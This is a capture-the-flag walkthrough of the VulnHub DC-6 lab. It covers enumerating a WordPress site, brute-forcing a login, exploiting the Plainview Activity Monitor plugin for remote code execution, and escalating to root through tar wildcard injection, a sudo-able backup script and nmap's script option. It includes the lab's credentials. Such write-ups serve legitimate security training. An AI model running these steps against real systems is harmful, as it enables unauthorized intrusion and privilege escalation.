# BOX NAME: DC-6
**LINK**: https://www.vulnhub.com/entry/dc-6,315/

<details open><summary><ins>SUMMARY</ins></summary>

```
1. Enumerate box, bruteforce wp.
2. Use know exploit to gain a foothold. Stabalize
3. Pivot to other user using notes left from other user. grab mysql credentials.
4. exploit tar backup-script from third user.
5. GTFO-bin on nmap.

This box was quite fun. Many pivot points on box. Got me fixing up a wordpress bruteforce script. 
You can exploit the jens user either with the long hard way, or the easy way.
Either to just echo "/bin/bash" into the backups.sh and run it as jens.
or you modify it to exploit tar wildcard and put a few files in the graham home directory. Like so

```
``` 
This works because of tar wildcard injection.
graham@dc-6:~$ > ./--checkpoint=1
graham@dc-6:~$ > '--checkpoint-action=exec=sh shell.sh'
graham@dc-6:~$echo "/bin/bash" > shell.sh

#!/bin/bash
cd /home/graham
tar -czf backups.tar.gz *

graham@dc-6:~$ sudo -u jens /home/jens/backups.sh
tar (child): backups.tar.gz: Cannot open: Permission denied
tar (child): Error is not recoverable: exiting now
jens@dc-6:/home/graham$ 
```
</details>

# REMOTE ENUMERATION:

<details><summary><ins>TARGET</ins></summary>

```
[+] IP:		10.77.0.69
[+] URL:	http://dc-6
```
</details>
<details><summary><ins>NMAP</ins></summary>

```
└─$ nmap -sV -sC $IP -oN nmap-dc6.log
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-03 09:28 CEST
Nmap scan report for 10.77.0.69
Host is up (0.00094s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 3e52cece01b694eb7b037dbe087f5ffd (RSA)
|   256 3c836571dd73d723f8830de346bcb56f (ECDSA)
|_  256 41899e85ae305be08fa4687106b415ee (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Did not follow redirect to http://wordy/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.51 seconds
```
</details>
<details><summary><ins>WEB</ins></summary>

whatweb-scan
```
└─$ whatweb $URL --log-verbose=whatweb-dc6.log
http://dc-6/ [301 Moved Permanently] Apache[2.4.25], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.25 (Debian)], IP[10.77.0.69], RedirectLocation[http://wordy/], UncommonHeaders[x-redirect-by]
ERROR Opening: http://wordy/ - no address for wordy

##Redirects to wordy. Add it in /etc/hosts.##

└─$ whatweb $URL --log-verbose=whatweb-dc6.log
http://dc-6/ [301 Moved Permanently] Apache[2.4.25], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.25 (Debian)], IP[10.77.0.69], RedirectLocation[http://wordy/], UncommonHeaders[x-redirect-by]
http://wordy/ [200 OK] Apache[2.4.25], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.25 (Debian)], IP[10.77.0.69], JQuery[1.12.4], MetaGenerator[WordPress 5.1.1], PoweredBy[WordPress], Script[text/javascript], Title[Wordy &#8211; Just another WordPress site], UncommonHeaders[link], WordPress[5.1.1]
```

nikto-scan
```
└─$ nikto -h $URL | tee nikto-dc6.log
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.77.0.69
+ Target Hostname:    dc-6
+ Target Port:        80
+ Start Time:         2023-05-03 09:29:30 (GMT2)
---------------------------------------------------------------------------
+ Server: Apache/2.4.25 (Debian)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: Uncommon header 'x-redirect-by' found, with contents: WordPress.
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ Root page / redirects to: http://wordy/
+ /index.php?: Drupal Link header found with value: ARRAY(0x55dbd3e58628). See: https://www.drupal.org/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.25 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
+ /wp-links-opml.php: This WordPress script reveals the installed version.
+ /license.txt: License file found may identify site software.
+ /wp-login.php?action=register: Cookie wordpress_test_cookie created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
+ /wp-login.php: Wordpress login found.
+ 7850 requests: 0 error(s) and 11 item(s) reported on remote host
+ End Time:           2023-05-03 09:30:07 (GMT2) (37 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```

fuzzing
```

```
wpscan
```
[+] admin
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://wordy/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] mark
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] graham
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] sarah
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] jens
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection
```
wpscan-plugins
```
[+] akismet
 | Location: http://wordy/wp-content/plugins/akismet/
 | Latest Version: 5.1
 | Last Updated: 2023-04-05T10:17:00.000Z
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://wordy/wp-content/plugins/akismet/, status: 403
 |
 | The version could not be determined.

[+] plainview-activity-monitor
 | Location: http://wordy/wp-content/plugins/plainview-activity-monitor/
 | Last Updated: 2018-08-26T15:08:00.000Z
 | Readme: http://wordy/wp-content/plugins/plainview-activity-monitor/readme.txt
 | [!] The version is out of date, the latest version is 20180826
 | [!] Directory listing is enabled
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://wordy/wp-content/plugins/plainview-activity-monitor/, status: 200
 |
 | Version: 20161228 (50% confidence)
 | Found By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://wordy/wp-content/plugins/plainview-activity-monitor/readme.txt

[+] user-role-editor
 | Location: http://wordy/wp-content/plugins/user-role-editor/
 | Last Updated: 2023-03-13T09:06:00.000Z
 | Readme: http://wordy/wp-content/plugins/user-role-editor/readme.txt
 | [!] The version is out of date, the latest version is 4.63.3
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://wordy/wp-content/plugins/user-role-editor/, status: 200
 |
 | Version: 4.24 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://wordy/wp-content/plugins/user-role-editor/readme.txt

``` 

</details></details>

<details><summary><ins>SERVICES</ins></summary>

FTP
```

```

SSH
```

```

SNMP
```

```

DNS
```

```

MAILSERVICES (POP, IMAP, SMTP)
```

```

LDAP
```

```

</details>

<details><summary><ins>Active Directory</ins></summary>

Active Directory
```

```
</details>

<details><summary><ins>SUMMARY REMOTE</ins></summary>

```
It's a wordpress site running on Apache[2.4.25]. The wordpress version is 5.1.1 with user-role-editor and plainview-activity-monitor plugins.
We found a few users and searchsploit reveals vulerabilites in the plugins.

WordPress Plugin User Role Editor 3.12 - Cross-Site Request Forgery               | php/webapps/25721.txt
WordPress Plugin User Role Editor < 4.25 - Privilege Escalation                   | php/webapps/44595.rb
WordPress Plugin Plainview Activity Monitor 20161228 - (Authenticated) Command In | php/webapps/45274.html
WordPress Plugin Plainview Activity Monitor 20161228 - Remote Code Execution (RCE | php/webapps/50110.py

We can also see private posts etc with:
WordPress Core < 5.2.3 - Viewing Unauthenticated/Password/Private Posts           | multiple/webapps/47690.md
s
a quick gander reveals the changelog matches the date of planview-activity-monitor
http://wordy/wp-content/plugins/plainview-activity-monitor/readme.txt
So the RCE needs to be authenticad, so let's try and bruteforce the passwords. 
I'll start with a smaller passwords-list, if no match, maybe I'll try my own web bruter. Could be fun.
```
```
$ time python3 wordpress-bruter.py -H http://wordy/wp-login.php -f1 log -f2 pwd -f3 'Log In' -U usernames.txt -P passwords.txt -C 'wordpress_test_cookie=WP+Cookie+check' -s 'The password you entered for the username' -y
## Login Found ## 
mark:helpdesk01
``` 
```
I spent way to long on the bruteforce, until I realized there was a tio from the author. *pulls hair*
"cat /usr/share/wordlists/rockyou.txt | grep k01 > passwords.txt"
```

```
└─$ python3 plainview-RCE.py
What's your target IP?
10.77.0.69
What's your username?
mark
What's your password?
helpdesk01
[*] Please wait...
[*] Perfect! 
www-data@10.77.0.69  id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@10.77.0.69  
```
```
the plainview-rce.py was seemingly very unstable so I used it to upload a php-shell.php and executed that while logged in as mark.
www-data@dc-6:/$ 

soooo much better :)
```

</details>

# LOCAL ENUMERATION:

<details><summary><ins>FILES OF INTEREST</ins></summary>

**FILES**:
```
/home/mark/stuff/things-to-do.txt

www-data@dc-6:/home/mark/stuff$ cat things-to-do.txt 
Things to do:

- Restore full functionality for the hyperdrive (need to speak to Jens)
- Buy present for Sarah's farewell party
- Add new user: graham - GSo7isUM1D4 - done
- Apply for the OSCP course
- Buy new laptop for Sarah's replacement


```

```
graham@dc-6:/home/jens$ sudo -l
Matching Defaults entries for graham on dc-6:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User graham may run the following commands on dc-6:
    (jens) NOPASSWD: /home/jens/backups.sh

echo '/bin/bash' >> backups.sh

sudo -u jens /home/jens/backups.sh
jens@dc-6:~$ id
uid=1004(jens) gid=1004(jens) groups=1004(jens),1005(devs)

jens can run nmap as root. How lucky am i?

jens@dc-6:~$ sudo -l
Matching Defaults entries for jens on dc-6:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jens may run the following commands on dc-6:
    (root) NOPASSWD: /usr/bin/nmap
```

**SUID's**:

```
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/passwd
/bin/su
/bin/mount
/bin/umount
/bin/ping
```
**SGID's**:

```
/usr/bin/crontab
/usr/bin/wall
/usr/bin/chage
/usr/bin/expiry
/usr/bin/bsd-write
/usr/bin/ssh-agent
/usr/bin/dotlockfile
/sbin/unix_chkpwd
```
**OTHERS**:

```

```
</details>


# LOOT

<details><summary><ins>USEFUL INFORMATION:</ins></summary>

**Kernel Info:**
*file /bin/bash ; echo -e " \\n" && lsb_release -a ; echo -e "\\n" && uname -a*
```
/bin/bash: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=4be0cc32aba02ec4e0f010047be5ae9dee756960, stripped
 

No LSB modules are available.
Distributor ID: Debian
Description:    Debian GNU/Linux 9.8 (stretch)
Release:        9.8
Codename:       stretch


Linux dc-6 4.9.0-8-amd64 #1 SMP Debian 4.9.144-3.1 (2019-02-19) x86_64 GNU/Linux

```
</details>

<details><summary><ins>CREDS:</ins></summary>

```
username:password
admin
jens
sarah
graham:GSo7isUM1D4
mark:helpdesk01
```
```
wpdbuser:meErKatZ [mysql]
```
</details>

<details><summary><ins>HASHES:</ins></summary>

```

```
</details>

# PROOFS

<details><summary><ins>Proofs</ins></summary>

Final payload:
```
su graham GSo7isUM1D4
echo /bin/bash >> /home/jens/backups.sh
echo /bin/bash > exploit.sh
chmod +x exploit.sh
sudo /usr/bin/nmap --script=exploit.sh

jens@dc-6:~$ sudo /usr/bin/nmap --script=exploit.sh

Starting Nmap 7.40 ( https://nmap.org ) at 2023-05-03 22:34 AEST
NSE: Warning: Loading 'exploit.sh' -- the recommended file extension is '.nse'.
root@dc-6:/home/jens#
```

```
jens@dc-6:~$ sudo /usr/bin/nmap --script=exploit.sh

Starting Nmap 7.40 ( https://nmap.org ) at 2023-05-03 22:34 AEST
NSE: Warning: Loading 'exploit.sh' -- the recommended file extension is '.nse'.
root@dc-6:/home/jens# root@dc-6:/home/jens# root@dc-6:/home/jens# root@dc-6:~# root@dc-6:~# theflag.txt
root@dc-6:~# 

Yb        dP 888888 88     88         8888b.   dP"Yb  88b 88 888888 d8b 
 Yb  db  dP  88__   88     88          8I  Yb dP   Yb 88Yb88 88__   Y8P 
  YbdPYbdP   88""   88  .o 88  .o      8I  dY Yb   dP 88 Y88 88""   `"' 
   YP  YP    888888 88ood8 88ood8     8888Y"   YbodP  88  Y8 888888 (8) 


Congratulations!!!

Hope you enjoyed DC-6.  Just wanted to send a big thanks out there to all those
who have provided feedback, and who have taken time to complete these little
challenges.

If you enjoyed this CTF, send me a tweet via @DCAU7.

```

</details>